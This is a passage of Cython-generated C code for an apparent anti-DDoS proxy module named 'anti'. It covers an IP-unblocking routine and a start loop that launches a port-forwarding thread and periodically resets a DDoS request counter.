            __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_1);
            PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_1);
            __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_6);
            if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_stdin, __pyx_t_6) < 0) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_DEVNULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_6);
            if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_stdout, __pyx_t_6) < 0) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_v__ = __pyx_t_6;
            __pyx_t_6 = 0;
            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Remove_All_Block_IP_from_Port_co, __pyx_n_s_format); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 180, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 180, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_2 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
                if (likely(__pyx_t_2)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                    __Pyx_INCREF(__pyx_t_2);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_1, function);
                }
            }
            __pyx_t_6 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 180, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 180, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__25, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 181, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            goto __pyx_L4_break;
        }
        __pyx_t_5 = (__Pyx_PyUnicode_Equals(__pyx_v_a, __pyx_n_u_N, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 183, __pyx_L1_error)
            if (!__pyx_t_5) {
            }
            else {
                __pyx_t_4 = __pyx_t_5;
                goto __pyx_L8_bool_binop_done;
            }
        __pyx_t_5 = (__Pyx_PyUnicode_Equals(__pyx_v_a, __pyx_n_u_n, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 183, __pyx_L1_error)
            __pyx_t_4 = __pyx_t_5;
    __pyx_L8_bool_binop_done:;
        if (__pyx_t_4) {
            goto __pyx_L4_break;
        }
    }
__pyx_L4_break:;
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7);
    __Pyx_AddTraceback("anti.remove_block", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XDECREF(__pyx_v_a);
    __Pyx_XDECREF(__pyx_v__);
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_23start(PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyMethodDef __pyx_mdef_4anti_23start = { "start", (PyCFunction)__pyx_pw_4anti_23start, METH_O, 0 };
static PyObject* __pyx_pw_4anti_23start(PyObject* __pyx_self, PyObject* __pyx_v_port) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("start (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_22start(__pyx_self, ((PyObject*)__pyx_v_port));
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_22start(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port) {
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    PyObject* __pyx_t_4 = NULL;
    PyObject* __pyx_t_5 = NULL;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    int __pyx_t_8;
    PyObject* __pyx_t_9 = NULL;
    PyObject* __pyx_t_10 = NULL;
    PyObject* __pyx_t_11 = NULL;
    PyObject* __pyx_t_12 = NULL;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("start", 0);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 186, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
        }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 186, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_config_fake_0_1_2_3, __pyx_n_s_format); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_host_fake); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_port_fake); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_host_real); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_port_real); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_8 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
            __pyx_t_8 = 1;
        }
    }
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_2)) {
        PyObject* __pyx_temp[5] = { __pyx_t_3, __pyx_t_4, __pyx_t_5, __pyx_t_6, __pyx_t_7 };
        __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp + 1 - __pyx_t_8, 4 + __pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 188, __pyx_L1_error)
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    }
    else
#endif
#if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
            PyObject* __pyx_temp[5] = { __pyx_t_3, __pyx_t_4, __pyx_t_5, __pyx_t_6, __pyx_t_7 };
            __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp + 1 - __pyx_t_8, 4 + __pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 188, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        else
#endif
        {
            __pyx_t_9 = PyTuple_New(4 + __pyx_t_8); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 188, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_9);
            if (__pyx_t_3) {
                __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_3); __pyx_t_3 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_4);
            PyTuple_SET_ITEM(__pyx_t_9, 0 + __pyx_t_8, __pyx_t_4);
            __Pyx_GIVEREF(__pyx_t_5);
            PyTuple_SET_ITEM(__pyx_t_9, 1 + __pyx_t_8, __pyx_t_5);
            __Pyx_GIVEREF(__pyx_t_6);
            PyTuple_SET_ITEM(__pyx_t_9, 2 + __pyx_t_8, __pyx_t_6);
            __Pyx_GIVEREF(__pyx_t_7);
            PyTuple_SET_ITEM(__pyx_t_9, 3 + __pyx_t_8, __pyx_t_7);
            __pyx_t_4 = 0;
            __pyx_t_5 = 0;
            __pyx_t_6 = 0;
            __pyx_t_7 = 0;
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_9, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 188, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 188, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__26, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 189, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Thread); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_9);
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_open_port); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_target, __pyx_t_7) < 0) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = PyTuple_New(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_INCREF(__pyx_v_port);
    __Pyx_GIVEREF(__pyx_v_port);
    PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_port);
    if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_args, __pyx_t_7) < 0) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_9); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_start); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_9);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
        }
    }
    __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 190, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_sleep); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 191, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_9);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
        }
    }
    __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_7, __pyx_int_2) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_int_2);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 191, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    while (1) {
        {
            __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_10, &__pyx_t_11, &__pyx_t_12);
            __Pyx_XGOTREF(__pyx_t_10);
            __Pyx_XGOTREF(__pyx_t_11);
            __Pyx_XGOTREF(__pyx_t_12); {
                __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_No_DDOS_in_seconds_reset_count, __pyx_n_s_format); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 194, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_9);
                __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_reset_on_time); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 194, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_7);
                __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 194, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                __pyx_t_7 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_9);
                    if (likely(__pyx_t_7)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                        __Pyx_INCREF(__pyx_t_7);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_9, function);
                    }
                }
                __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_7, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_1);
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 194, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_9 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 194, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_9 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 195, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_9);
                if (PyDict_SetItem(__pyx_d, __pyx_n_s_ddos, __pyx_t_9) < 0) __PYX_ERR(0, 195, __pyx_L5_error)
                    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sleep); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 196, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_2);
                __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_reset_on_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 196, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_7 = __Pyx_PyNumber_Float(__pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 196, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_7);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __pyx_t_1 = NULL;
                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
                    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
                    if (likely(__pyx_t_1)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                        __Pyx_INCREF(__pyx_t_1);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_2, function);
                    }
                }
                __pyx_t_9 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_7);
                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 196, __pyx_L5_error)
                    __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            }
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
            goto __pyx_L12_try_end;
        __pyx_L5_error:;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            __pyx_t_8 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyboardInterrupt);
            if (__pyx_t_8) {
                __Pyx_AddTraceback("anti.start", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_9, &__pyx_t_2, &__pyx_t_7) < 0) __PYX_ERR(0, 197, __pyx_L7_except_error)
                    __Pyx_GOTREF(__pyx_t_9);
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_GOTREF(__pyx_t_7);
                __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 198, __pyx_L7_except_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_builtin_input); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 199, __pyx_L7_except_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_kill_process); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 200, __pyx_L7_except_error)
                    __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_5 = NULL;
                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
                    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
                    if (likely(__pyx_t_5)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                        __Pyx_INCREF(__pyx_t_5);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_6, function);
                    }
                }
                __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 200, __pyx_L7_except_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                goto __pyx_L6_exception_handled;
            }
            goto __pyx_L7_except_error;
        __pyx_L7_except_error:;
            __Pyx_XGIVEREF(__pyx_t_10);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
            goto __pyx_L1_error;
        __pyx_L6_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_10);
            __Pyx_XGIVEREF(__pyx_t_11);
            __Pyx_XGIVEREF(__pyx_t_12);
            __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
        __pyx_L12_try_end:;
        }
    }
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_9);
    __Pyx_AddTraceback("anti.start", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

static int __pyx_import_star_set(PyObject* o, PyObject* py_name, char* name) {
    static const char* internal_type_names[] = {
      "__pyx_ctuple_Py_ssize_t",
      "__pyx_ctuple_Py_ssize_t_struct",
      "__pyx_ctuple_double",
      "__pyx_ctuple_double_struct",
      "__pyx_ctuple_long",
      "__pyx_ctuple_long_struct",
      0
    };
    const char** type_name = internal_type_names;
    while (*type_name) {
        if (__Pyx_StrEq(name, *type_name)) {
            PyErr_Format(PyExc_TypeError, "Cannot overwrite C type %s", name);
            goto bad;
        }
        type_name++;
    }
    if (0);
    else {
        if (PyObject_SetAttr(__pyx_m, py_name, o) < 0) goto bad;
    }
    return 0;
bad:
    return -1;
}

static int
__Pyx_import_all_from(PyObject* locals, PyObject* v)
{
    PyObject* all = PyObject_GetAttrString(v, "__all__");
    PyObject* dict, * name, * value;
    int skip_leading_underscores = 0;
    int pos, err;
    if (all == NULL) {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError))
            return -1;
        PyErr_Clear();
        dict = PyObject_GetAttrString(v, "__dict__");
        if (dict == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError))
                return -1;
            PyErr_SetString(PyExc_ImportError,
                "from-import-* object has no __dict__ and no __all__");
            return -1;
        }
#if PY_MAJOR_VERSION < 3
        all = PyObject_CallMethod(dict, (char*)"keys", NULL);
#else
